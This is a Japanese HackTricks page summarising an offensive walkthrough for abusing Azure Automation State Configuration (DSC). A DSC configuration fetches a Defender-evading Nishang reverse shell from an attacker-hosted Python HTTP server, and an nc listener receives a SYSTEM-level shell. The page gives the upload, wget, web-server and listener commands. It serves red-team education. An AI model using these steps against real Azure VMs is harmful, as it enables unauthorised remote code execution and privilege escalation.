# Az - State Configuration RCE

<details>

<summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>でAWSハッキングをゼロからヒーローまで学ぶ</strong></a><strong>！</strong></summary>

HackTricks をサポートする他の方法:

- **HackTricks で企業を宣伝したい**または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
- [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com)を入手する
- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
- **💬 [Discordグループ](https://discord.gg/hRep4RUj7f)**に参加するか、[telegramグループ](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)をフォローする
- **ハッキングトリックを共有するために、[HackTricks](https://github.com/carlospolop/hacktricks)と[HackTricks Cloud](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出する**

</details>

**完全な投稿を確認: [https://medium.com/cepheisecurity/abusing-azure-dsc-remote-code-execution-and-privilege-escalation-ab8c35dd04fe](https://medium.com/cepheisecurity/abusing-azure-dsc-remote-code-execution-and-privilege-escalation-ab8c35dd04fe)**

### リモートサーバー（C2）インフラストラクチャの準備と手順の要約

#### 概要
このプロセスは、Windows Defender をバイパスするために設計された `RevPS.ps1` という名前の変更された Nishang `Invoke-PowerShellTcp.ps1` ペイロードをホストするリモートサーバーインフラストラクチャを設定することを含みます。このペイロードは、IPが `40.84.7.74` のKali Linuxマシンから単純なPython HTTPサーバーを使用して提供されます。この操作は、次の手順を通じて実行されます:

#### ステップ1 — ファイルの作成
- **必要なファイル:** 2つのPowerShellスクリプトが必要です:
1. `reverse_shell_config.ps1`: ペイロードを取得して実行する望ましい状態構成（DSC）ファイル。[GitHub](https://github.com/nickpupp0/AzureDSCAbuse/blob/master/reverse_shell_config.ps1)から入手できます。
2. `push_reverse_shell_config.ps1`: 構成をVMに公開するスクリプト。[GitHub](https://github.com/nickpupp0/AzureDSCAbuse/blob/master/push_reverse_shell_config.ps1)で入手できます。
- **カスタマイズ:** これらのファイル内の変数とパラメータは、リソース名、ファイルパス、サーバー/ペイロード識別子など、ユーザー固有の環境に合わせて調整する必要があります。

#### ステップ2 — 構成ファイルの圧縮
- `reverse_shell_config.ps1` を `.zip` ファイルに圧縮して、Azure Storage Account に転送する準備を整えます。
```powershell
Compress-Archive -Path .\reverse_shell_config.ps1 -DestinationPath .\reverse_shell_config.ps1.zip
```
#### ステップ3 — ストレージコンテキストの設定とアップロード
- 圧縮された構成ファイルは、AzureのSet-AzStorageBlobContentコマンドレットを使用して、事前定義されたAzure Storageコンテナであるazure-pentestにアップロードされます。
```powershell
Set-AzStorageBlobContent -File "reverse_shell_config.ps1.zip" -Container "azure-pentest" -Blob "reverse_shell_config.ps1.zip" -Context $ctx
```
#### ステップ 4 — Kaliボックスの準備
- Kaliサーバーは、GitHubリポジトリからRevPS.ps1ペイロードをダウンロードします。
```bash
wget https://raw.githubusercontent.com/nickpupp0/AzureDSCAbuse/master/RevPS.ps1
```
#### ステップ5 — 設定ファイルの公開
- 設定ファイルが実行され、逆シェルスクリプトが指定された場所に展開されます。

#### ステップ6 — ペイロードのホスティングとリスナーの設定
- Python SimpleHTTPServerを起動してペイロードをホストし、Netcatリスナーを設定して着信接続をキャプチャします。
```bash
sudo python -m SimpleHTTPServer 80
sudo nc -nlvp 443
```
- 予定されたタスクはペイロードを実行し、SYSTEMレベルの特権を獲得します。

#### 結論

このプロセスの成功した実行は、資格情報のダンプや複数のVMへの攻撃の拡大など、さまざまな行動の可能性を開きます。このガイドは、Azure Automation DSCの領域での継続的な学習と創造性を奨励しています。

<details>

<summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>を使って、ゼロからヒーローまでAWSハッキングを学ぶ</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksで企業を宣伝したい**または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)をフォローする**
* **HackTricks**と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks)のGitHubリポジトリにPRを提出して、あなたのハッキングトリックを共有する

</details>
